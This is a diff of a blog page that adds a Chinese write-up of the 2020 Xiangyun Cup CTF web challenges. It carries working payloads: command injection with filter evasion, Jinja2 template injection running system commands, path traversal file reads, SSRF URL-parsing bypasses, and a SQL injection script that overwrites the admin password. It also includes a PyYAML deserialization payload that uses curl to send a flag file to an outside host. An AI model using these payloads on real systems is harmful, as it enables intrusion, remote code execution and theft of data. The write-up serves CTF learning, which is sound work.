@@ -66,6 +66,596 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-2020祥云杯web题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/11/24/2020%E7%A5%A5%E4%BA%91%E6%9D%AFweb%E9%A2%98%E8%A7%A3/" class="article-date">
+  <time class="dt-published" datetime="2020-11-24T10:30:16.522Z" itemprop="datePublished">2020-11-24</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/11/24/2020%E7%A5%A5%E4%BA%91%E6%9D%AFweb%E9%A2%98%E8%A7%A3/">2020祥云杯web题解</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="祥云杯web题解"><a href="#祥云杯web题解" class="headerlink" title="祥云杯web题解"></a>祥云杯web题解</h1><h2 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h2><p>题目源码</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+if (isset($_GET[&#39;url&#39;])) {
+  $ip=$_GET[&#39;url&#39;];
+  if(preg_match(&quot;/(;|&#39;| |&gt;|]|&amp;| |\\$|python|sh|nc|tac|rev|more|tailf|index|php|head|nl|tail|less|cat|ruby|perl|bash|rm|cp|mv|\*|\{)/i&quot;, $ip)){
+      die(&quot;&lt;script language=&#39;javascript&#39; type=&#39;text/javascript&#39;&gt;
+      alert(&#39;no no no!&#39;)
+      window.location.href=&#39;index.php&#39;;&lt;/script&gt;&quot;);
+  }else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){
+      die(&quot;&lt;script language=&#39;javascript&#39; type=&#39;text/javascript&#39;&gt;
+      alert(&#39;no flag!&#39;)
+      window.location.href=&#39;index.php&#39;;&lt;/script&gt;&quot;);
+  }
+  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
+}</code></pre>
+<p>测试发现过滤了:<code>&#39;,$,&amp;,*,;,&gt;,],{, ,</code><br>利用%09来绕过对空格的过滤</p>
+<pre><code>http://eci-2ze5a6nc0glncs99tzta.cloudeci1.ichunqiu.com/?url=-h|`echo%09WTJGMElDOWxkR012TG1acGJtUm1iR0ZuTDJac1lXY3VkSGgw|base64%09-d|base64%09-d`</code></pre><h2 id="flaskbot"><a href="#flaskbot" class="headerlink" title="flaskbot"></a>flaskbot</h2><p>测试一波发现输入点都没有ssti,并且开着报错</p>
+<p>我们利用报错来拿源码</p>
+<p>最关键的源码<code>render_template_string(guessNum(num,name))</code> 是直接访问不存在界面得到的</p>
+<pre><code class="python">@app.route(&#39;/&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;])
+def Hello():
+    if request.method == &quot;POST&quot;:
+        user = request.form[&#39;name&#39;]
+        resp = make_response(render_template(&quot;guess.html&quot;,name=user))
+        resp.set_cookie(&#39;user&#39;,base64.urlsafe_b64encode(user),max_age=3600)
+        return resp
+    else:
+        user=request.cookies.get(&#39;user&#39;)
+        if user == None:
+           return render_template(&quot;index.html&quot;)
+        else:
+            user=user.encode(&#39;utf-8&#39;)
+            return render_template(&quot;guess.html&quot;,name=base64.urlsafe_b64decode(user))
+
+
+@app.route(&#39;/guess&#39;,methods=[&#39;POST&#39;])
+def Guess():
+    user=request.cookies.get(&#39;user&#39;)
+
+    if user==None:
+        return redirect(url_for(&quot;Hello&quot;)
+    user=user.encode(&#39;utf-8&#39;)
+    name = base64.urlsafe_b64decode(user)
+    num = float(request.form[&#39;num&#39;])
+    if(num&lt;0):
+        return &quot;Too Small&quot;
+    elif num&gt;1000000000.0:
+        return &quot;Too Large&quot;
+
+    else:
+        return render_template_string(guessNum(num,name))#直接提醒我们这里存在ssti注入
+
+@app.errorhandler(404)
+def miss(e):
+    return &quot;What are you looking for?!!&quot;.getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)), 404
+
+if __name__ == &#39;__main__&#39;:
+    f_handler=open(&#39;/var/log/app.log&#39;, &#39;w&#39;)
+    sys.stderr=f_handler
+    app.run(debug=True, host=&#39;0.0.0.0&#39;,port=8888</code></pre>
+<p>看一下回显很容易得知bot利用二分法来猜数据，如果一定次数内bot没猜出来就是我们赢，正常的数据基本是不行的。</p>
+<p>我们看下他得到数字的过程:</p>
+<pre><code class="python">num = float(request.form[&#39;num&#39;])
+    if(num&lt;0):
+        return &quot;Too Small&quot;
+    elif num&gt;1000000000.0:
+        return &quot;Too Large&quot;
+</code></pre>
+<p>字符串转数值且小于0大于1000000000.0</p>
+<p>阅读python文档<a href="https://docs.python.org/3.2/library/stdtypes.html#numeric-types-int-float-complex，我们看到一个这样的浮点数:`" target="_blank" rel="noopener">https://docs.python.org/3.2/library/stdtypes.html#numeric-types-int-float-complex，我们看到一个这样的浮点数:`</a> float also accepts the strings “nan” and “inf” with an optional prefix “+” or “-” for Not a Number (NaN) and positive or negative infinity. `</p>
+<p>且nan&lt;0,nan&gt;1000000000.0都为false,这样他的二分法永远猜不到了</p>
+<p>然后修改name进行ssti</p>
+<pre><code>{{"".__class__.__mro__[2].__subclasses__()[258].__init__.__getattribute__("__globals__")["\\x6f\\x73"].__getattribute__("\\x73ystem")("whoami")}}</code></pre><h2 id="easygogogo"><a href="#easygogogo" class="headerlink" title="easygogogo"></a>easygogogo</h2><p>题目有三个接口，登入，查看上传文件，上传文件</p>
+<p>测试上传文件接口发现，可以直接路径穿越</p>
+<p>测试查看上传文件接口发现，可以任意文件读取，但是你得有cookie(通过文件上传生成)</p>
+<p>/proc/self/cmdline</p>
+<pre><code>HOSTNAME=engine-1 HOME=/root OLDPWD=/root TERM=xterm PATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin GOPATH=/go PWD=/go GOLANG_VERSION=1.15.5</code></pre><p>刚开始去读/etc/passwd发现，啥都没有，但是读/proc/self/cmdline就有东西，然后猜测了下这是root权限启动的</p>
+<p>由于重启docker环境并不是让cookie的salt发生改变，所以，如果用之前生成好的cookie(如果是root权限/etc/passwd被覆盖)去获得新docker的/etc/passwd有内容的话就说明是root权限，没有的话就是其他原因</p>
+<p>。。。。。</p>
+<p>真的是root权限！！！！！</p>
+<p>直接读取/root/start.sh</p>
+<pre><code class="bash">flagfile=/flag
+if [ ${ICQ_FLAG} ];then
+    if [ &quot;$flagfile&quot;x = &quot;/flagx&quot; ];then
+        echo ${ICQ_FLAG} &gt; ${flagfile}
+        chmod 755 ${flagfile}
+    else
+        #sed -i &quot;s/flag{x*}/${ICQ_FLAG}/&quot; $flagfile
+        sed -i -r &quot;s/flag\{.*\}/${ICQ_FLAG}/&quot; $flagfile
+        #mysql -uroot -proot nXXXX &lt; $flagfile
+    fi
+    echo [+] sed flag OK
+    unset ICQ_FLAG
+else
+    echo [!] no ICQ_FLAG
+fi
+
+service cron start&amp;&amp;whoami&amp;&amp;cd /go&amp;&amp;go run src/main.go src/functions.go src/model.go src/routes.go</code></pre>
+<p>再去读取/flag，顺便读了下源码：</p>
+<p>main.go</p>
+<pre><code class="go">package main
+
+import (
+    &quot;log&quot;
+    &quot;net/http&quot;
+)
+func main() {
+    http.Handle(&quot;/uploads/&quot;, http.StripPrefix(&quot;/uploads/&quot;, http.FileServer(http.Dir(&quot;uploads/&quot;))))
+    http.Handle(&quot;/statics/&quot;, http.StripPrefix(&quot;/statics/&quot;, http.FileServer(http.Dir(&quot;statics/&quot;))))
+    http.HandleFunc(&quot;/index&quot;, index)
+    http.HandleFunc(&quot;/&quot;, index)
+    http.HandleFunc(&quot;/login&quot;, login)
+    http.HandleFunc(&quot;/upload&quot;, upload)
+    http.HandleFunc(&quot;/show&quot;, show)
+    http.HandleFunc(&quot;/home&quot;, home)
+    err := http.ListenAndServe(&quot;:80&quot;, nil)
+    if err != nil {
+        log.Fatal(&quot;ListenAndServe: &quot;, err)
+    }
+}</code></pre>
+<p>src/functions.go</p>
+<pre><code class="go">package main
+
+import (
+    &quot;bytes&quot;
+    &quot;crypto/md5&quot;
+    &quot;encoding/base64&quot;
+    &quot;encoding/gob&quot;
+    &quot;encoding/hex&quot;
+    &quot;net/http&quot;
+    &quot;os&quot;
+    &quot;time&quot;
+)
+
+func PathExists(path string) (bool, error) {
+    _, err := os.Stat(path)
+    if err == nil {
+        return true, nil
+    }
+    if os.IsNotExist(err) {
+        return false, nil
+    }
+    return false, err
+}
+func fileExist(filename string) bool {
+    _, err := os.Stat(filename)
+    return err == nil || os.IsExist(err)
+}
+func Md5(s string) string {
+    h := md5.New()
+    h.Write([]byte(s))
+    return hex.EncodeToString(h.Sum(nil))
+}
+func getCookie(r *http.Request) interface{}{
+    cookie, err := r.Cookie(&quot;cookie&quot;)
+    if err==nil{
+        return cookie.Value
+    }else{
+        return nil
+    }
+}
+func setCookie(w http.ResponseWriter,r *http.Request,value string){
+    expiration := time.Now()
+    expiration = expiration.AddDate(1, 0, 0)
+//    fmt.Println(value)
+    cookie := http.Cookie{Name: &quot;cookie&quot;, Value: value, Expires: expiration}
+    http.SetCookie(w, &amp;cookie)
+}
+func serialize(instance Users) []byte{
+//    fmt.Println(instance.Username)
+    var result bytes.Buffer
+    encoder := gob.NewEncoder(&amp;result)
+    encoder.Encode(instance)
+    userBytes := result.Bytes()
+//    fmt.Printf(&quot;%s&quot;,userBytes)
+    return userBytes
+}
+func unseralize(data []byte) Users{
+    var account Users
+    decoder := gob.NewDecoder(bytes.NewReader(data))
+    decoder.Decode(&amp;account)
+    return account
+}
+
+func cookieEncode(data []byte) string{
+//    fmt.Printf(&quot;%s&quot;,data)
+    return base64.StdEncoding.EncodeToString(data)
+}
+func cookieDecode(data string) []byte{
+    bytesData, _ := base64.StdEncoding.DecodeString(data)
+    return bytesData
+}</code></pre>
+<p>src/model.go</p>
+<pre><code class="go">package main
+
+type Users struct{
+    Username string
+    Password string
+    Filename string
+    Sign string
+}
+var salt=&quot;123123adsdasr123sdfkaadls&quot;</code></pre>
+<p>src/routes.go</p>
+<pre><code class="go">package main
+
+import (
+    &quot;encoding/base64&quot;
+    &quot;fmt&quot;
+    &quot;html/template&quot;
+    &quot;io&quot;
+    &quot;net/http&quot;
+    &quot;os&quot;
+    &quot;strings&quot;
+)
+//Route:upload
+func upload(w http.ResponseWriter, r *http.Request) {
+    r.Body = http.MaxBytesReader(w, r.Body, 32&lt;&lt;16)
+    ip := strings.Split(r.RemoteAddr, &quot;:&quot;)[0]
+    if getCookie(r)!=nil{
+        UserData:=unseralize(cookieDecode(getCookie(r).(string)))
+        if r.Method == &quot;GET&quot; {
+            t, _ := template.ParseFiles(&quot;upload.gtpl&quot;)
+            t.Execute(w,nil)
+        } else {
+            path:=&quot;./uploads/&quot;+Md5(ip)
+            tmp,_:=PathExists(path)
+            if !tmp{
+                err:= os.Mkdir(path, os.ModePerm)
+                if err!=nil{
+                    fmt.Printf(&quot;failed&quot;)
+                }
+            }
+            r.ParseMultipartForm(32 &lt;&lt; 20)
+            file, handler, err := r.FormFile(&quot;uploadfile&quot;)
+            if err != nil {
+                fmt.Println(err)
+                return
+            }
+            defer file.Close()
+            f, err := os.OpenFile(&quot;./uploads/&quot;+Md5(ip)+&quot;/&quot;+handler.Filename, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, 0777)
+            if err != nil {
+                fmt.Fprint(w,err)
+                return
+            }
+            defer f.Close()
+            io.Copy(f, file)
+            UserData.Filename=&quot;./uploads/&quot;+Md5(ip)+&quot;/&quot;+handler.Filename
+            UserData.Sign=Md5(UserData.Filename+salt)
+            setCookie(w,r,cookieEncode((serialize(UserData))))
+            fmt.Fprint(w,UserData)
+            fmt.Fprint(w,&quot;上传成功：&quot;+handler.Filename)
+            return
+        }
+    }else{
+        fmt.Fprint(w,&quot;&lt;script&gt;alert(&#39;Login first my baby&#39;);&lt;/script&gt;&quot;)
+        return
+    }
+}
+
+//Route:/index || /
+func index(w http.ResponseWriter, r *http.Request) {
+    t, _ := template.ParseFiles(&quot;index.gtpl&quot;)
+    t.Execute(w,nil)
+    return
+}
+
+//Route:/login
+func login(w http.ResponseWriter, r *http.Request) {
+    if r.Method==&quot;POST&quot;{
+        r.ParseForm()
+        if r.Form[&quot;username&quot;]==nil &amp;&amp; r.Form[&quot;password&quot;]==nil{
+            fmt.Fprint(w,&quot;username and password is required&quot;)
+            return
+        }
+        User:=Users{
+            Username: r.Form[&quot;username&quot;][0],
+            Password: r.Form[&quot;password&quot;][0],
+        }
+        setCookie(w,r,cookieEncode(serialize(User)))
+        fmt.Fprint(w,&quot;&lt;script&gt;window.location.href=&#39;/home&#39;&lt;/script&gt;&quot;)
+    }else{
+        fmt.Fprint(w,&quot;Method not allowed&quot;)
+        return
+    }
+}
+func home(w http.ResponseWriter,r *http.Request){
+    if getCookie(r)!=nil {
+        t, _ := template.ParseFiles(&quot;home.gtpl&quot;)
+        t.Execute(w, nil)
+    }else{
+        fmt.Fprint(w,&quot;&lt;script&gt;alert(&#39;Login first my baby&#39;);&lt;/script&gt;&quot;)
+        return
+    }
+}
+
+//Route:/show
+func show(w http.ResponseWriter, r *http.Request) {
+    if getCookie(r)!=nil {
+        UserData:=unseralize(cookieDecode(getCookie(r).(string)))
+        file:=UserData.Filename
+        sign:=UserData.Sign
+        ff, err := os.Open(file)
+        defer ff.Close()
+        if err!=nil{
+            fmt.Println(err)
+            t, _ := template.ParseFiles(&quot;show.gtpl&quot;)
+            t.Execute(w, template.HTML(&quot;？？？？？&quot;))
+            return
+        }
+        fmt.Println(sign)
+        if sign!=Md5(file+salt){
+            fmt.Fprint(w,&quot;签名失败&quot;)
+            return
+        }
+        sourcebuffer := make([]byte, 500000)
+        n, _ := ff.Read(sourcebuffer)
+        filedata := base64.StdEncoding.EncodeToString(sourcebuffer[:n])
+        fmt.Println(filedata)
+        t, _ := template.ParseFiles(&quot;show.gtpl&quot;)
+        t.Execute(w, template.HTML(&quot;&lt;img src=&#39;data:image/jpeg;base64,&quot;+filedata+&quot;&#39;&gt;&quot;))
+    }else{
+        fmt.Fprint(w,&quot;&lt;script&gt;alert(&#39;Login first my baby&#39;);&lt;/script&gt;&quot;)
+        return
+    }
+}</code></pre>
+<p>这样应该是非预期把？</p>
+<h2 id="doyouknowssrf"><a href="#doyouknowssrf" class="headerlink" title="doyouknowssrf"></a>doyouknowssrf</h2><pre><code class="php">&lt;?php
+// ini_set(&quot;display_errors&quot;, &quot;On&quot;);
+// error_reporting(E_ALL | E_STRICT);
+
+
+function safe_url($url,$safe) {
+    $parsed = parse_url($url);
+    $validate_ip = true;
+    if($parsed[&#39;port&#39;]  &amp;&amp; !in_array($parsed[&#39;port&#39;],array(&#39;80&#39;,&#39;443&#39;))){
+
+        echo &quot;&lt;b&gt;请求错误:非正常端口,因安全问题只允许抓取80,443端口的链接,如有特殊需求请自行修改程序&lt;/b&gt;&quot;.PHP_EOL;
+
+        return false;
+    }else{
+        preg_match(&#39;/^\d+$/&#39;, $parsed[&#39;host&#39;]) &amp;&amp; $parsed[&#39;host&#39;] = long2ip($parsed[&#39;host&#39;]);
+        $long = ip2long($parsed[&#39;host&#39;]);
+        if($long===false){
+            $ip = null;
+            if($safe){
+                @putenv(&#39;RES_OPTIONS=retrans:1 retry:1 timeout:1 attempts:1&#39;);
+                $ip   = gethostbyname($parsed[&#39;host&#39;]);
+                $long = ip2long($ip);
+                $long===false &amp;&amp; $ip = null;
+                @putenv(&#39;RES_OPTIONS&#39;);
+            }
+        }else{
+            $ip = $parsed[&#39;host&#39;];
+        }
+        $ip &amp;&amp; $validate_ip = filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);
+    }
+
+    if(!in_array($parsed[&#39;scheme&#39;],array(&#39;http&#39;,&#39;https&#39;)) || !$validate_ip){
+        echo &quot;&lt;b&gt;{$url} 请求错误:非正常URL格式,因安全问题只允许抓取 http:// 或 https:// 开头的链接或公有IP地址&lt;/b&gt;&quot;.PHP_EOL;
+
+        return false;
+    }else{
+        return $url;
+    }
+}
+
+
+function curl($url){
+    $safe = false;
+    if(safe_url($url,$safe)) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        $co = curl_exec($ch);
+        curl_close($ch);
+        echo $co;
+    }
+}
+
+highlight_file(__FILE__);
+curl($_GET[&#39;url&#39;]);
+</code></pre>
+<p>emmm，这题是原题。<a href="https://tyaoo.github.io/2020/08/31/2020-GACTF-web/" target="_blank" rel="noopener">https://tyaoo.github.io/2020/08/31/2020-GACTF-web/</a> ,我是后来才知道的。。。。</p>
+<p>绕过端口限制的方法一种是：<code>http://foo@127.0.0.1:6379%20@www.baidu.com/</code></p>
+<p>还有一个是：<code>http:/ctf.ccreater.top:5000/</code></p>
+<p><code>var_dump(parse_url)</code></p>
+<pre><code>array(2) {
+  &#39;scheme&#39; =&gt;
+  string(4) &quot;http&quot;
+  &#39;path&#39; =&gt;
+  string(23) &quot;/ctf.ccreater.top:5000/&quot;
+}</code></pre><p>然后curl去访问是正常的</p>
+<p>接下来按着那个wp走发现flask,继续ssrf，发现redis，原本是wp里面的redis主从复制RCE直接打这题的，但是试了好久都没成功，明明有向我发送数据</p>
+<p>redis ssrf还有一种RCE方法是写文件，这一题就是这么干的，因为那个wp我一直没往这方面想</p>
+<p>然后去看了写redis发现它的版本是2.x主从复制RCE的那个exp是针对3.x和4.x  ：(</p>
+<h2 id="easyzzz"><a href="#easyzzz" class="headerlink" title="easyzzz"></a>easyzzz</h2><p>百度一波网上的cve解出这题</p>
+<p>简单说下过程</p>
+<p>/plugins/webuploader/js/webconfig.php</p>
+<p>拿到后台地址  admin539/</p>
+<p><a href="https://xz.aliyun.com/t/7414" target="_blank" rel="noopener">https://xz.aliyun.com/t/7414</a> ，利用前台sql注入修改管理员密码</p>
+<p>搭个转发的方便测试</p>
+<pre><code class="python">import requests
+from flask import Flask,request
+app = Flask(__name__)
+
+
+def access(exp):
+    burp0_url = &quot;http://eci-2ze9cofh8j38ebxctduq.cloudeci1.ichunqiu.com:80/plugins/sms/sms_list.php?act=del&quot;
+    burp0_cookies = {&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943&quot;: &quot;1604567758,1604568322,1604568358,1605921830&quot;, &quot;Hm_lpvt_2d0601bd28de7d49818249cf35d95943&quot;: &quot;1606016268&quot;, &quot;PHPSESSID&quot;: &quot;3fe85864bb4ad1dc9f25e5271281baf9&quot;, &quot;__jsluid_h&quot;: &quot;85077cc270ca34654c02f2479fcb9390&quot;, &quot;zzz254_adminpass&quot;: &quot;0&quot;}
+    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
+    burp0_data = {&quot;id[={exp} ;-- ]&quot;.format(exp=exp): &quot;1&quot;}
+    return requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
+
+@app.route(&#39;/&#39;)
+def hello_world():
+    payload = request.args.get(&quot;exp&quot;,&quot;&quot;)
+    r=access(payload)
+    print(payload)
+    return r.text
+
+
+app.run()</code></pre>
+<p>直接访问:</p>
+<p><code>http://127.0.0.1:5000/?exp=1;replace INTO zzz_user(uid,u_gid, u_lid, u_onoff, u_order, sex, username, password, question, answer, regtime, truename, face, province, city, district, address, post, tel, mobile, email, qq, u_desc, adminrand, lastlogintime, lastloginip, logincount, sysinfo, points, balance) VALUES (1, 1, 1, 1, 0, &#39;%E7%94%B7&#39;, &#39;admin&#39;, &#39;1ccbbb718e0e9c3a&#39;, &#39;8TBRJ2H5NXW57EVF&#39;, &#39;S8DDQC9YV494G84Q&#39;, &#39;&#39;, &#39;%E5%88%9B%E5%A7%8B%E4%BA%BA&#39;, &#39;face01.png&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;6a79122eab1e8abd10bcabd91ebbc36c&#39;, &#39;2020/11/22 17:25:13&#39;, &#39;127.0.0.1&#39;, 6, &#39;&#39;, 0, 0);--</code></p>
+<p>修改admin密码为041676</p>
+<p>没有写权限，但是我们只要读到flag就好了，利用这个cms的模板渲染机制，修改模板为我们想读的文件/flag，来拿到flag</p>
+<h2 id="profile-system"><a href="#profile-system" class="headerlink" title="profile system"></a>profile system</h2><p>一看就是一个flask(它的cookie)，文件上传可以目录穿越，猜测后端访问uploads路由是这样的：<code>/uploads/&lt;path:path&gt;</code><br>直接读取<code>/uploads/../app.py</code></p>
+<p>app.py</p>
+<pre><code class="python">from flask import Flask, render_template, request, flash, redirect, send_file,session,render_template_string
+import os
+import re
+from hashlib import md5
+import yaml
+
+
+app = Flask(__name__)
+app.config[&#39;UPLOAD_FOLDER&#39;] = os.path.join(os.curdir, &quot;uploads&quot;)
+app.config[&#39;SECRET_KEY&#39;] = &#39;Th1s_is_A_Sup333er_s1cret_k1yyyyy&#39;
+ALLOWED_EXTENSIONS = {&#39;yaml&#39;,&#39;yml&#39;}
+
+def allowed_file(filename):
+    return &#39;.&#39; in filename and filename.rsplit(&#39;.&#39;, 1)[1].lower()
+
+@app.route(&quot;/&quot;)
+def index():
+    session[&#39;priviledge&#39;] = &#39;guest&#39;
+    return &quot;home&quot;
+
+@app.route(&quot;/upload&quot;, methods=[&quot;POST&quot;])
+def upload():
+    file = request.files[&quot;file&quot;]
+    if file.filename == &#39;&#39;:
+        flash(&#39;No selected file&#39;)
+        return redirect(&quot;/&quot;)
+    elif not (allowed_file(file.filename) in ALLOWED_EXTENSIONS):
+        flash(&#39;Please upload yaml/yml only.&#39;)
+        return redirect(&quot;/&quot;)
+    else:
+        dirname = md5(request.remote_addr.encode()).hexdigest()
+        filename = file.filename
+        session[&#39;filename&#39;] = filename 
+        upload_directory = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], dirname)
+        if not os.path.exists(upload_directory):
+            os.mkdir(upload_directory)
+        upload_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], dirname, filename)
+        file.save(upload_path)
+        return os.path.join(dirname, filename)
+
+
+@app.route(&quot;/uploads/&lt;path:path&gt;&quot;)
+def uploads(path):
+    return send_file(os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], path))
+
+
+@app.route(&quot;/view&quot;)
+def view():
+    dirname = md5(request.remote_addr.encode()).hexdigest()
+    realpath = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], dirname,session[&#39;filename&#39;]).replace(&#39;..&#39;,&#39;&#39;)
+    if session[&#39;priviledge&#39;] ==&#39;elite&#39; and os.path.isfile(realpath):
+        try:
+            with open(realpath,&#39;rb&#39;) as f:
+                data = f.read()
+                if not re.fullmatch(b&quot;^[ -\-/-\]a-}\n\r]*$&quot;,data, flags=re.MULTILINE):
+                    info = {&#39;user&#39;: &#39;elite-user&#39;}
+                    flash(&#39;Sth weird...&#39;)
+                else:
+                    info = yaml.load(data)
+                if info[&#39;user&#39;] == &#39;Administrator&#39;:
+                    flash(&#39;Welcome admin!&#39;)
+                else:
+                    raise ()
+        except :
+            info = {&#39;user&#39;: &#39;elite-user&#39;}
+    else:
+        info = {&#39;user&#39;: &#39;guest&#39;}
+    return render_template_string(&quot;{{user}}&quot;,user=info[&#39;user&#39;])
+#.,^,_,`,~
+
+
+if __name__ == &quot;__main__&quot;:
+    app.run(&#39;0.0.0.0&#39;,port=8888,threaded=True)
+</code></pre>
+<p>有了secret我们就可以任意伪造session了</p>
+<p>注意到：<code>info = yaml.load(data)</code></p>
+<p>直接使用这个会有个提醒</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201122221248.png" alt="image16652"></p>
+<p>百度一下为啥不安全，yaml反序列化注入get</p>
+<p>直接抄来一个exp</p>
+<pre><code class="yaml">!!python/object/new:type
+  args: [&quot;z&quot;, !!python/tuple [], {&quot;extend&quot;: !!python/name:exec }]
+  listitems: &quot;\x5f\x5fimport\x5f\x5f(&#39;os&#39;)\x2esystem(&#39;curl -POST mil1\x2eml/jm9 -F x=@flag\x2etxt&#39;)&quot;</code></pre>
+<p>看下进入<code>info = yaml.load(data)</code> 的前提</p>
+<p><code>re.fullmatch(b&quot;^[ -\-/-\]a-}\n\r]*$&quot;,data, flags=re.MULTILINE)</code></p>
+<p>利用<a href="https://regex101.com/" target="_blank" rel="noopener">regex101</a>读懂这个的意思，其实就是禁止出现</p>
+<pre><code>.^_`~</code></pre><p>这几个字符</p>
+<p>这个payload完美符合所有条件</p>
+<p>一定要注意payload不能出现\r</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>python的float类型有两个特殊的值：nan(not a number),inf(infinity,无穷)</p>
+<p><strong>php parse_url 小trick</strong></p>
+<p><code>var_dump(parse_url(&quot;http:/ctf.ccreater.top:5000/&quot;))</code></p>
+<pre><code>array(2) {
+  &#39;scheme&#39; =&gt;
+  string(4) &quot;http&quot;
+  &#39;path&#39; =&gt;
+  string(23) &quot;/ctf.ccreater.top:5000/&quot;
+}</code></pre><p><code>http://foo@127.0.0.1:6379%20@www.baidu.com/</code>:<a href="https://bugs.php.net/bug.php?id=77991" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=77991</a></p>
+<pre><code>var_dump(parse_url(&quot;http://foo@127.0.0.1:6379%20@www.baidu.com&quot;));
+php shell code:1:
+array(4) {
+  &#39;scheme&#39; =&gt;
+  string(4) &quot;http&quot;
+  &#39;host&#39; =&gt;
+  string(13) &quot;www.baidu.com&quot;
+  &#39;user&#39; =&gt;
+  string(13) &quot;foo@127.0.0.1&quot;
+  &#39;pass&#39; =&gt;
+  string(7) &quot;6379%20&quot;
+}</code></pre><p>python 中的yaml.load也存在反序列化问题</p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/11/24/2020祥云杯web题解/">http://blog.ccreater.top/2020/11/24/2020祥云杯web题解/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/11/24/2020%E7%A5%A5%E4%BA%91%E6%9D%AFweb%E9%A2%98%E8%A7%A3/" data-id="ckhvu8wso0000bsvd9hkdab1p" data-title="2020祥云杯web题解" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
     <article id="post-XNUCA_2020_oooooooldjs题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/11/13/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/" class="article-date">
@@ -2223,473 +2813,6 @@ namespace {
 
 
   
-    <article id="post-jdk7u21反序列化复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/10/04/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/" class="article-date">
-  <time class="dt-published" datetime="2020-10-04T13:59:22.747Z" itemprop="datePublished">2020-10-04</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/web/">web</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/10/04/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/">jdk7u21反序列化复现</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="JDK7u21反序列化链复现"><a href="#JDK7u21反序列化链复现" class="headerlink" title="JDK7u21反序列化链复现"></a>JDK7u21反序列化链复现</h1><p>exp:</p>
-<pre><code class="java">public class jdk7u21 {
-    public static void main(String[] args) throws Exception {
-
-            TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl(&quot;calc&quot;);//生成恶意的calc
-            calc.getOutputProperties();//调用getOutputProperties就可以执行calc
-    }
-}</code></pre>
